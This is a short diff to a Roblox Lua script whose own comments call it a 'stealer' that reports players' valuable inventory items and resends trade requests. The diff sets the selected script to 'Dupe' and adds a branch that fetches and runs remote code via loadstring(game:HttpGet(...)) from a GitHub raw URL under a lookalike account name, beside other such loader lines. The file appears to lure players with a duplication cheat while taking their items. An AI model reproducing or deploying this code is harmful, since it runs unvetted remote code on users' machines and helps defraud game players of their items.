@@ -4,7 +4,7 @@ Config = {
     FullInventory = true, -- If true, it will display all of the player's items.
     GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
     ResendTrade = "gg", -- Send this in chat to resend the trade request if you don't receive it.
-    Script = "None", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    Script = "Dupe", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
     CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
 }
 
@@ -95,8 +95,8 @@ elseif Config.Script == "R3TH PRIV" then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
 elseif Config.Script == "AshbornnHub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
-elseif Config.Script == "Nexus" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
+elseif Config.Script == "Dupe" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
 end
 
 Executor = identifyexecutor()
